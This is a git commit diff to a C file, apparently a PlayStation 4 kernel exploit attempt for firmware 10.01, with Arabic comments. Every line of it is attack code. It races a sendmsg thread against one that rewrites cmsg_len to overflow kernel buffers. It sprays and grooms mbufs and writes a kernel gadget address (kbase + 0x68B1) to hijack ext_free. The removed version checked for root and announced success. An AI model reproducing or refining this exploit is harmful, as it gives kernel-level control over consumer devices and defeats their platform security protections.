195330e4e36b911d78e4cf28a8477223204dbf1d
Dark-life944 <168915806+Dark-life944@users.noreply.github.com>
2026-03-19 20:41:13 +0100

    Update main.c

--- examples/ps4-backup/source/main.c
+++ examples/ps4-backup/source/main.c
@@ -1,7 +1,6 @@
 #include <ps4.h>
-//#include "payload_utils.h" // ضروري لاستخدام get_kernel_base()
+//#include "payload_utils.h"
 
-// تعريف الهياكل الضرورية
 struct msghdr {
     void         *msg_name;
     uint32_t      msg_namelen;
@@ -18,100 +17,97 @@ struct cmsghdr {
     int           cmsg_type;
 };
 
-// الإزاحات الخاصة بـ 10.01 التي وجدتها
-#define JMP_RSI_GADGET_OFFSET 0x68B1
 #define IP_RETOPTS 7
-#define ITERATIONS 500000 // زيادة المحاولات للسباق
 #define CONTROL_LEN 256
+#define SPRAY_COUNT 128
 
 struct cmsghdr *cmsg;
 uint8_t control_buf[CONTROL_LEN];
 int global_sock;
-int running = 1;
+int spray_socks[SPRAY_COUNT];
 
-// خيط إرسال الرسالة (Trigger)
+// دالة لعمل Push (حجز mbufs في الذاكرة)
+void push_mbufs() {
+    for(int i = 0; i < SPRAY_COUNT; i++) {
+        spray_socks[i] = syscall(97, 2, 2, 0); // socket(AF_INET, SOCK_DGRAM, 0)
+        if(spray_socks[i] > 0) {
+            // نرسل بيانات صغيرة لضمان حجز mbuf
+            sendto(spray_socks[i], "A", 1, 0, NULL, 0);
+        }
+    }
+}
+
+// دالة لعمل Pop (تحرير بعض الـ mbufs لخلق ثقوب)
+void pop_mbufs() {
+    for(int i = 0; i < SPRAY_COUNT; i += 2) {
+        if(spray_socks[i] > 0) {
+            syscall(6, spray_socks[i]); // close
+            spray_socks[i] = -1;
+        }
+    }
+}
+
 void *sendmsg_thread(void *arg) {
+    (void)arg;
     struct msghdr msg;
     memset(&msg, 0, sizeof(msg));
     msg.msg_control = control_buf;
     msg.msg_controllen = CONTROL_LEN;
 
-    while(running) {
-        // Syscall 28 هو sendmsg
+    while(1) {
+        // محاولة استغلال الثغرة لكتابة الفائض
         syscall(28, global_sock, &msg, 0);
     }
     return NULL;
 }
 
-// خيط السباق (The Racer)
 void *race_thread(void *arg) {
-    while(running) {
-        cmsg->cmsg_len = 0x50;   // القيمة الصحيحة للفحص
-        cmsg->cmsg_len = 0xFFFF; // القيمة الفائضة للفيضان
+    (void)arg;
+    while(1) {
+        cmsg->cmsg_len = 0x50;   // القيمة العادية
+        cmsg->cmsg_len = 0xFFFF; // القيمة التي تسبب الفيضان
     }
     return NULL;
 }
 
-// دالة بناء البايلود باستخدام Offsets 10.01
-void build_payload(uint64_t kbase) {
+int _main(struct thread *td) {
+    (void)td;
+    initKernel();
+    initLibc();
+    initNetwork();
+
+    // جلب عنوان النواة والقاعدة
+    uint64_t kbase = get_kernel_base();
+    // 10.01 JMP_RSI_GADGET = 0x68B1
+    uint64_t target_gadget = kbase + 0x68B1; 
+
+    global_sock = syscall(97, 2, 2, 0);
+    
+    // إعداد البايلود لاستهداف ext_free
     memset(control_buf, 0, CONTROL_LEN);
     cmsg = (struct cmsghdr *)control_buf;
     cmsg->cmsg_level = 0; 
     cmsg->cmsg_type = IP_RETOPTS;
     cmsg->cmsg_len = 0x50;
 
-    // وضع الـ Gadget في مكان ext_free المتوقع عند حدوث الفيضان
-    // نضع العنوان في أماكن متعددة لزيادة احتمالية الإصابة (Spraying)
-    uint64_t target_gadget = kbase + JMP_RSI_GADGET_OFFSET;
-    for (int i = 0x60; i < CONTROL_LEN - 8; i += 8) {
+    // حقن عنوان الـ Gadget في أماكن استراتيجية داخل البفر لتعديل ext_free
+    for (int i = 0x50; i < CONTROL_LEN - 8; i += 8) {
         *(uint64_t *)(control_buf + i) = target_gadget;
     }
-}
 
-int _main(struct thread *td) {
-    // 1. تهيئة المكتبات من الـ SDK
-    initKernel();
-    initLibc();
-    initNetwork();
+    // ترتيب الذاكرة (Grooming)
+    push_mbufs();
+    pop_mbufs();
 
-    // 2. جلب Kernel Base تلقائياً (من ملف payload_utils.h)
-    uint64_t kbase = get_kernel_base();
-    if (kbase == 0) return -1;
-
-    // 3. تجهيز المقبس والبايلود
-    global_sock = syscall(97, 2, 2, 0); // socket(AF_INET, SOCK_DGRAM, 0)
-    build_payload(kbase);
-
-    // 4. إعداد الأنوية (Affinity) لضمان سرعة السباق
     ScePthread thread1, thread2;
-    cpuset_t cpu6, cpu7;
-    CPU_ZERO(&cpu6); CPU_ZERO(&cpu7);
-    CPU_SET(6, &cpu6); CPU_SET(7, &cpu7);
 
-    // 5. إطلاق الخيوط
+    // ملاحظة: الـ SDK يستخدم مسميات مختلفة للـ Affinity
+    // سنقوم بإنشاء الخيوط بشكل مباشر
     scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
-    scePthreadSetaffinityNp(thread1, sizeof(cpu6), &cpu6);
-
     scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");
-    scePthreadSetaffinityNp(thread2, sizeof(cpu7), &cpu7);
 
-    // 6. المراقبة: هل نجحنا في أن نصبح Root؟
-    while(running) {
-        if (getuid() == 0) {
-            running = 0; // إيقاف السباق
-            
-            // إرسال إشعار بالنجاح
-            SceNotificationRequest notify;
-            notify.type = 0;
-            snprintf(notify.message, sizeof(notify.message), "Root Success! FW 10.01");
-            sceKernelSendNotificationRequest(0, &notify, sizeof(notify), 0);
-            
-            // هنا يمكنك استدعاء الـ Jailbreak الفعلي من الـ SDK
-            //jailbreak(); 
-            break;
-        }
-        sceKernelUsleep(500000); // تفقد كل نصف ثانية
-    }
+    // بما أنك مجلبرك، يمكنك إرسال إشعار لرؤية الكود وهو يعمل
+    sceKernelDebugOutText(0, "Exploit Started: Racing for ext_free...\n");
 
     scePthreadJoin(thread1, NULL);
     scePthreadJoin(thread2, NULL);
